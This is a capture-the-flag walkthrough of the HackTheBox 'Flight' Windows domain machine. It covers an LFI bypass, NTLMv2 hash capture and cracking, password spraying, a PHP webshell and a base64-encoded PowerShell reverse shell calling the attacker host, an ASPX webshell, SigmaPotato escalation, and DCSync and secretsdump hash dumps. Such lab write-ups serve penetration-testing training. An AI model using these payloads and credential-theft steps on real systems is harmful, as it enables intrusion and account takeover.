---
title: Flight [Hard]
date: 2025-09-04
categories: [HackTheBox, OSEP]
tags: AD Web Windows
img_path: /assets/Images/HTB_Flight/logo.png
image:
  path: /assets/Images/HTB_Flight/logo.png
---

# Flight [Hard] OSEP

![Screenshot 2025-09-04 at 9.29.37 PM.png](/assets/Images/HTB_Flight/Screenshot_2025-09-04_at_9.29.37_PM.png)

## 🤨 Enumeration

For Subdomain Fuzzing by using wfuzz

```bash
wfuzz -u http://10.129.228.120 -H "Host: FUZZ.flight.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 7069
```

![image.png](/assets/Images/HTB_Flight/image.png)

![image.png](/assets/Images/HTB_Flight/image%201.png)

### flight.htb : 80

Nothing interesting in this site , Static pages

![image.png](/assets/Images/HTB_Flight/image%202.png)

### school.flight.htb : 80

This page shows that its made in php and have `?view=` parameter

![image.png](/assets/Images/HTB_Flight/image%203.png)

![image.png](/assets/Images/HTB_Flight/image%204.png)

## 🔱 Initial Access

### LFI - school.flight.htb

```bash
http://school.flight.htb/index.php?view=C:/Windows/System32/Drivers/etc/hosts
```

![image.png](/assets/Images/HTB_Flight/image%205.png)

While trying for LFI input gets detected 

![image.png](/assets/Images/HTB_Flight/image%206.png)

```bash
GET /index.php?view=C:/Windows/System32/Drivers/etc/hosts HTTP/1.1
Host: school.flight.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i

```

Bypassed with forward slash

![image.png](/assets/Images/HTB_Flight/image%207.png)

### NTLM Theft Via SSRF

### svc_apache

from the view= we can trigger it to our responder so we can catch NTLMv2 hash

```bash
responder -I tun0
```

```bash
curl http://school.flight.htb/index.php?view=/10.10.14.90/share/poc.txt
```

![image.png](/assets/Images/HTB_Flight/image%208.png)

```bash
[SMB] NTLMv2-SSP Client   : 10.129.228.120
[SMB] NTLMv2-SSP Username : flight\svc_apache
[SMB] NTLMv2-SSP Hash     : svc_apache::flight:7ca8f653345addb4:143D6AA99174C06243AF26B91A7F5D7E:0101000000000000807458EAF91DDC0143077FC043CAB245000000000200080034004B003800310001001E00570049004E002D0045004D00300058004900350033004200420053004D0004003400570049004E002D0045004D00300058004900350033004200420053004D002E0034004B00380031002E004C004F00430041004C000300140034004B00380031002E004C004F00430041004C000500140034004B00380031002E004C004F00430041004C0007000800807458EAF91DDC0106000400020000000800300030000000000000000000000000300000DC010A163FB0CB2296929D19CD689200262B0F5E16ADAE290B0521E203D509310A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00390030000000000000000000
```

Crack it via John

```bash
**john svc_apache_NTLMv2**

Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
**S@Ss!K@*t13      (svc_apache)**     
1g 0:00:00:04 DONE (2025-09-05 00:16) 0.2320g/s 2474Kp/s 2474Kc/s 2474KC/s SANTIBANEZ..Ryanelkins
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

![image.png](/assets/Images/HTB_Flight/image%209.png)

```bash
svc_apache:S@Ss!K@*t13
```

Checking Shares there is Shared and Web 2 share which this user can Read

```bash
nxc smb 10.129.228.120 -u 'svc_apache' -p 'S@Ss!K@*t13' --shares
```

![image.png](/assets/Images/HTB_Flight/image%2010.png)

Also made a List of users

![image.png](/assets/Images/HTB_Flight/image%2011.png)

### S.Moon

Trying ASRep-Roasting

```bash
GetNPUsers.py -dc-ip 10.129.228.120 flight.htb/ -usersfile users.txt -format hashcat

/usr/local/bin/GetNPUsers.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.13.0.dev0+20250701.160936.2e87adef', 'GetNPUsers.py')
Impacket v0.13.0.dev0+20250701.160936.2e87adef - Copyright Fortra, LLC and its affiliated companies 

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User G0$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User S.Moon doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User R.Cold doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User G.Lors doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User L.Kein doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User M.Gold doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User C.Bum doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User W.Walker doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User I.Francis doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User D.Truff doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User V.Stevens doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc_apache doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User O.Possum doesn't have UF_DONT_REQUIRE_PREAUTH set

```

Trying Kerberoating

```bash
GetUserSPNs.py -request -dc-ip 10.129.228.120 flight.htb/svc_apache:'S@Ss!K@*t13'

/usr/local/bin/GetUserSPNs.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.13.0.dev0+20250701.160936.2e87adef', 'GetUserSPNs.py')
Impacket v0.13.0.dev0+20250701.160936.2e87adef - Copyright Fortra, LLC and its affiliated companies 

No entries found!
```

Password Spray [This thing gives you a s.moon user]

```bash
nxc smb $IP -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
```

![image.png](/assets/Images/HTB_Flight/image%2012.png)

Got s.moon password 

```bash
SMB     10.129.228.120  445    G0           [+] flight.htb\S.Moon:S@Ss!K@*t13
SMB     10.129.228.120  445    G0           [+] flight.htb\svc_apache:S@Ss!K@*t13
```

`s.moon` can write on that share on Shared 

```bash
nxc smb 10.129.228.120 -u 's.moon' -p 'S@Ss!K@*t13' --shares

nxc smb 10.129.228.120 -u 'svc_apache' -p 'S@Ss!K@*t13' --shares
```

![image.png](/assets/Images/HTB_Flight/image%2013.png)

### NTLM Theft via SMB

[https://github.com/Greenwolf/ntlm_theft.git](https://github.com/Greenwolf/ntlm_theft.git)

Using ntlm_theft tool to generate all type of files which can trigger a request on your smb server

![image.png](/assets/Images/HTB_Flight/image%2014.png)

Tranferring everything on the Shared

```bash
cd pain/
```

```bash
smbclientng -u 's.moon' -p 'S@Ss!K@*t13' --host 10.129.228.120

# user Shared
# put *
```

![image.png](/assets/Images/HTB_Flight/image%2015.png)

```bash
ls
```

![image.png](/assets/Images/HTB_Flight/image%2016.png)

After waiting for a second we got c.bum NTLMv2 hash

```bash
responder -I tun0
```

![image.png](/assets/Images/HTB_Flight/image%2017.png)

```bash
[SMB] NTLMv2-SSP Client   : 10.129.228.120
[SMB] NTLMv2-SSP Username : flight.htb\c.bum
[SMB] NTLMv2-SSP Hash     : c.bum::flight.htb:be0b9b0f74c85481:2AE1E2BEE08134014224630E31BBC866:0101000000000000802504E50B1EDC014928C40E3854A72300000000020008003300550046004B0001001E00570049004E002D005800520053003000520038005000590039004300360004003400570049004E002D00580052005300300052003800500059003900430036002E003300550046004B002E004C004F00430041004C00030014003300550046004B002E004C004F00430041004C00050014003300550046004B002E004C004F00430041004C0007000800802504E50B1EDC0106000400020000000800300030000000000000000000000000300000DC010A163FB0CB2296929D19CD689200262B0F5E16ADAE290B0521E203D509310A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00390030000000000000000000
```

Again cracking with John

```bash
john c.bum_ntlmv2  
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Tikkycoll_431012284 (c.bum)     
1g 0:00:00:04 DONE (2025-09-05 02:23) 0.2079g/s 2191Kp/s 2191Kc/s 2191KC/s TinyMutt69..Teacher21
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 

```

![image.png](/assets/Images/HTB_Flight/image%2018.png)

This User can Write on Web Share we can upload a file can access it through the web site and get a reverse shell

```bash
nxc smb 10.129.228.120 -u 'c.bum' -p 'Tikkycoll_431012284' --shares
```

![image.png](/assets/Images/HTB_Flight/image%2019.png)

c.bum is a WEBDEV Group member

![image.png](/assets/Images/HTB_Flight/image%2020.png)

Uploading shell.php file 

```bash
smbclientng -u 'c.bum' -p 'Tikkycoll_431012284' --host 10.129.228.120
```

![image.png](/assets/Images/HTB_Flight/image%2021.png)

Writting a php webshell because in the previous enumeration we got to know that the backend is in php

```bash
┌──(root㉿pain)-[/htb/flight]
└─# cat shell.php      
<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>
```

![image.png](/assets/Images/HTB_Flight/image%2022.png)

```bash
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.90',2004);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

```bash
powershell -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AMQAwAC4AMQA0AC4AOQAwACcALAAyADAAMAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACcAPgAgACcAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA
```

![image.png](/assets/Images/HTB_Flight/image%2023.png)

```bash
rlwrap -f . -r nc -lnvp 2004
```

![image.png](/assets/Images/HTB_Flight/image%2024.png)

I normally use Sliver because i don’t want to get presistences on that revshell and one thing that reveshell is not properly so it wil never show Powershell errors/cmd errors 

```bash
.\runascs.exe c.bum Tikkycoll_431012284 "cmd /c C:\Tools\shell.exe"
```

![image.png](/assets/Images/HTB_Flight/image%2025.png)

Got the sessions of `C.Bum`

![image.png](/assets/Images/HTB_Flight/image%2026.png)

You can read user.txt

![image.png](/assets/Images/HTB_Flight/image%2027.png)

## 💀 Priv Esc

Checking internal ports the uncommon port is 8000 that must be a UnderDevelopment website 

And in the C:\ folder there was a innetpub file where there is a development folder which also reveal that there is a Internal Site running

![image.png](/assets/Images/HTB_Flight/image%2028.png)

Using chisel for this ! i used the Sliver BOF Chisel version

```bash
chisel client 10.10.14.90:5555 R:1081:socks
```

```bash
./chisel_1.10.1_linux_arm64 server --port 5555 --reverse --socks5
```

![image.png](/assets/Images/HTB_Flight/image%2029.png)

configuring socks on firefox

![image.png](/assets/Images/HTB_Flight/image%2030.png)

Access the Site 

```bash
http://127.0.0.1:8000
```

![image.png](/assets/Images/HTB_Flight/image%2031.png)

Trying to check that the file which we are adding can we access it from the site

```bash
cd C:\inetpub\development
echo 'PAIN' > readme.txt
```

![image.png](/assets/Images/HTB_Flight/image%2032.png)

Reading readme.txt

```bash
http://127.0.0.1:8000/readme.txt
```

![image.png](/assets/Images/HTB_Flight/image%2033.png)

So the site is in `aspx` we have to upload aspx shell

### ASPX Webshell

[https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx)

Uploading the `webshell.aspx`

```bash
iwr http://10.10.14.90/webshell.aspx -OutFile webshell.aspx
```

![image.png](/assets/Images/HTB_Flight/image%2034.png)

Confirm that we have command execution

```bash
http://127.0.0.1:8000/webshell.aspx
```

![image.png](/assets/Images/HTB_Flight/image%2035.png)

Get a Sliver Beacon or you can use that same Powershell Blob to get the reverse shell

```bash
C:\Tools\shell.exe
```

![image.png](/assets/Images/HTB_Flight/image%2036.png)

### SeImpersonatePrivilege

Using SeImpersonate Privilege to Get NT System Session

```bash
whoami /priv
```

![image.png](/assets/Images/HTB_Flight/image%2037.png)

i used the sliver `getsystem` it does’nt work in this case

We are using SigmaPotao to execute our sliver implant

```bash
.\SigmaPotato.exe C:\Tools\shell.exe
```

![image.png](/assets/Images/HTB_Flight/image%2038.png)

Got the NT SYSTEM Shell

```bash
execute -o cmd.exe /c type "C:\Users\Administrator\Desktop\root.txt"
```

![image.png](/assets/Images/HTB_Flight/image%2039.png)

In sliver using sideload command [i forgot to use that ]

```bash
slideload /opt/Binarys/mimikatz.exe "lsadump::dcsync /user:flight\administratir /domain:flight.htb" "exit"
```

![image.png](/assets/Images/HTB_Flight/image%2040.png)

```bash
evil-winrm -i 10.129.228.120 -u 'Administartor' -H '43bbfc530bab76141b12c8446e30c17c'
```

Administrator Hash

```bash
43bbfc530bab76141b12c8446e30c17c
```

![image.png](/assets/Images/HTB_Flight/image%2041.png)

---

## Beyond Administrator

From `iis apppool\defaultapppool`

`iis apppool\defaultapppool` is a Microsoft Virtual Account. One thing about these accounts is that when they authenticate over the network, they do so as the machine account. For example, if I start `responder` and then try to open an SMB share on it (`net use \\10.10.14.6\doesntmatter`), the account I see trying to authenticate is flight\G0$:

```bash
ls \\10.10.14.90\pain
```

![image.png](/assets/Images/HTB_Flight/image%2042.png)

Using Rubeus tgtdeleg we can caught a Ticket from it

```bash
rubeus tgtdeleg /nowrap
```

![image.png](/assets/Images/HTB_Flight/image%2043.png)

Saving it to a file `.kribi` 

```bash
echo 'doIFVDCCBVCgAwIBBaEDAgEWooIEZDCCBGBhggRcMIIEWKADAgEFoQwbCkZMSUdIVC5IVEKiHzAdoAMCAQKhFjAUGwZrcmJ0Z3QbCkZMSUdIVC5IVEKjggQgMIIEHKADAgESoQMCAQKiggQOBIIECp8a/gf8OwGECV1OvnJA74KNtC/5tu0ceaZEsQiwRvquqzS0gA0E5gFNzoJ+AyAoAecPVIYHGlrKNwtt7cgjK/aaXBS+fR4mtxKsTM1M29kz7FsP6ZSL17Dx1/uElCdmF2AOJplUaP2ImxjTh5AhKiKErPCG9l3djT8Jcr16KDUDcQkK6j09Y9Ao1M7H/emhaUQU57rJ22+UHsXuCYDTMJ+2WTQ/jnqUblwnyEASF63e2tzEQfEJ3T5zlAdd3ey/fNgenwsOi00hS+AXc95yrWhd+Yj1m+0wK5YP02QBujF92qXDN3Lk96nXz+mu4bJqsDD9y2AHCp9SyQor7+yVKrVQKRPU9+31axu4y1QurBJRNRFexiEI4dAZikIJ1SqJTefpZpKuXctquJGCIyn9TxHxewfY2J+HXJ0MDnD044C0sjNf6thBi9cW9oi99qypPfJOcGOW/JoC401NCXGtJ5zMkmeEdzdp76abJrRsEZe2tOttuj3/UcA/svNCOQQPB1yuWfkEM8ipmbX9MKT20xGiz5bohbvkY3XWONGQvgdDTh/YVz7cFi3dZaC82nB88nY1eDDDBD+1CuS4BYbR4Tdz1P8vmpCA7YBzhC/rkn0Sls0XM/pgBz6+X7hhaBD/SuUGQpneDHRkyvHW8ZUZx5HKBecvwHtPPUfzHrdDex58GAw+5ZHZiVHrhfaq3MGTclljsfcnlJHu//zQevb/0vYoMbxdGSYQ/+e0bQoVo7GrERG9ZkAeM5WgNvIaE3vch/4jdlLBprdtuEqRMDDbhj+K9oRL+7WAXyNjqSivULhcaNYHQ1doO8AvNk8RO9XEGGXBbVSMXHSMVUEEnNIaH084FyXcZqX7e/Csjz+zv6WHYM8iVDjxStlNhZ+MPGiiAYRDsrc3TYCFz7pXniQ7AUFlkp00cqsZB+nToc5FqreTAKdmNI42aaF2z2xDxIw7M86tAW8wNy9FfKEmfq5fKTB0fGHw4JwMwhXyzRGzmVQj4a1XCK6kgFxe0Ffa47Gca4lD0XZIxOGbXrzLeL+H+09cLB6uzDk+4J2fYzx946f3nJaQtUSMZwvbv4VuiPF+hpnvnktIvp3TCDYh5PaJpmVZPqRm12sD3FYmmUWlBFmMAaQJzwsRwZhETTXs4tW6AtEMro7FUWHirIQNXVo/Z0IgUarfQBOSTnI9TEMTqv2WeEd7yUhvzyYBBL0SlkjDnWfQz/DmL69uYRd5iD+ZLe0c6iyWeMNosG8tzoTEvLYFXhafbeD3aTWVAXdwMjzAxhHPp0aUopsbrTtZjTI3Omw7GxDTrTaH7GYOpJmZotmUSqAQXVqkMYZAJ9NWFMzTQMG9S5wYG1nwu32zMRfcicjX/cywagYqf6M2o4HbMIHYoAMCAQCigdAEgc19gcowgceggcQwgcEwgb6gKzApoAMCARKhIgQgN7BMXkGS6EoID36hX6N8L2UoPJt3xfZvYWQ0eGKy/bahDBsKRkxJR0hULkhUQqIQMA6gAwIBAaEHMAUbA0cwJKMHAwUAYKEAAKURGA8yMDI1MDkwNDIyNDQwN1qmERgPMjAyNTA5MDUwODQ0MDdapxEYDzIwMjUwOTExMjI0NDA3WqgMGwpGTElHSFQuSFRCqR8wHaADAgECoRYwFBsGa3JidGd0GwpGTElHSFQuSFRC'| base64 -d > ticket.kirbi
```

```bash
ticketConvert.py ticket.kirbi ticket.ccache
```

```bash
export KRB5CCNAME=/htb/flight/ticket.ccache
```

```bash
nxc smb 10.129.228.120 -k --use-kcache -u g0$ -X "whoami"
```

Using Secrets dump to dump the whole domain

```bash
secretsdump.py -k -no-pass g0.flight.htb
```

![image.png](/assets/Images/HTB_Flight/image%2044.png)

```bash
Administrator:500:aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:6a2b6ce4d7121e112aeacbc6bd499a7f:::
S.Moon:1602:aad3b435b51404eeaad3b435b51404ee:f36b6972be65bc4eaa6983b5e9f1728f:::
R.Cold:1603:aad3b435b51404eeaad3b435b51404ee:5607f6eafc91b3506c622f70e7a77ce0:::
G.Lors:1604:aad3b435b51404eeaad3b435b51404ee:affa4975fc1019229a90067f1ff4af8d:::
L.Kein:1605:aad3b435b51404eeaad3b435b51404ee:4345fc90cb60ef29363a5f38e24413d5:::
M.Gold:1606:aad3b435b51404eeaad3b435b51404ee:78566aef5cd5d63acafdf7fed7a931ff:::
C.Bum:1607:aad3b435b51404eeaad3b435b51404ee:bc0359f62da42f8023fdde0949f4a359:::
W.Walker:1608:aad3b435b51404eeaad3b435b51404ee:ec52dceaec5a847af98c1f9de3e9b716:::
I.Francis:1609:aad3b435b51404eeaad3b435b51404ee:4344da689ee61b6fbbcdfa9303d324bc:::
D.Truff:1610:aad3b435b51404eeaad3b435b51404ee:b89f7c98ece6ca250a59a9f4c1533d44:::
V.Stevens:1611:aad3b435b51404eeaad3b435b51404ee:2a4836e3331ed290bd1c2fd2b50beb41:::
svc_apache:1612:aad3b435b51404eeaad3b435b51404ee:f36b6972be65bc4eaa6983b5e9f1728f:::
O.Possum:1613:aad3b435b51404eeaad3b435b51404ee:68ec50916875888f44caff424cd3f8ac:::
G0$:1001:aad3b435b51404eeaad3b435b51404ee:140547f31f4dbb4599dc90ea84c27e6b:::

```

---

### `Author : PaiN`